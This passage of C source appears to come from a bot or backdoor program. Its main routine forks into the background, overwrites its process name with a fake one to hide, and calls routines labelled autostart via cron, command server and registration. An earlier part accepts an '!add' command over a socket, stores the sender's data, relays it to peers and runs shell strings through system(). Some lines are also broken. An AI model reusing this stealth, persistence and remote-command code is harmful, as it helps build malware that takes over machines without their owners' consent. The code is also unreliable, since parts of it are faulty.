						param = strtok(NULL, " ");
					}
					char *pointer;
					pointer = strchr(command, '!add');
					{
						char *working_dir_path = realpath(".", NULL);
						char gwdadbp[1024];
						char adddbapp[1024] = {0};
						sprintf(gwdadbp,"%s/%s",working_dir_path,cliDB);
						char myTxt[1024];
						FILE *out = fopen(gwdadbp, "a");
						sprintf(adddbapp, "sort -u -o %s %s\n" , gwdadbp, gwdadbp);

						myTxt[0] = 0;
						fprintf(out, "%s\n", scan);
						fclose(out);

						sprintf(adddbapp, "sort -u -o %s %s\n" , gwdadbp, gwdadbp);

						system(adddbapp);

						//Send("Added Client");


						char *s = ("%s\n", scan);

						peers(s);


					}

				}

			}

		}close(sock->connSocket);

	}

}


int main(int argc, char **argv)
{

	char *working_dir_path = realpath(".", NULL);
	char dbcr[1024] = {0};
	char resrt[1024] = {0};
	char command[300];
	char data[1024];
	int on;
	if (fork()) exit(0);

	char gwdadbp[1024];
	sprintf(gwdadbp,"%s/%s",working_dir_path,cliDB);
	char gwdadbpadm[1024];
	sprintf(gwdadbpadm,"%s/%s",working_dir_path,admDB);

	sprintf(dbcr, "touch %s;touch %s;sort -u -o %s %s\n" , gwdadbp, gwdadbpadm, gwdadbp, gwdadbp);

	system(dbcr);

	FILE *file_pointer; 

	// open the file "name_of_file.txt" for writing
	file_pointer = fopen(gwdadbp, "a"); 

	// Write to the file
	fprintf(file_pointer, "%s \n",argv[1]);
	system(dbcr);


	// Close the file
	fclose(file_pointer); 
	sprintf(resrt,"sort -u -o %s %s\n",gwdadbp, gwdadbp);
	system(resrt);

	strncpy(argv[0],FAKENAME,strlen(argv[0]));
	for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));

	//AUTOSTART
	cron();
	//CMD SRV
	getcmd();
	//REG SRV
	RegIt();
	//ADD ME coz ...
	addme();


}
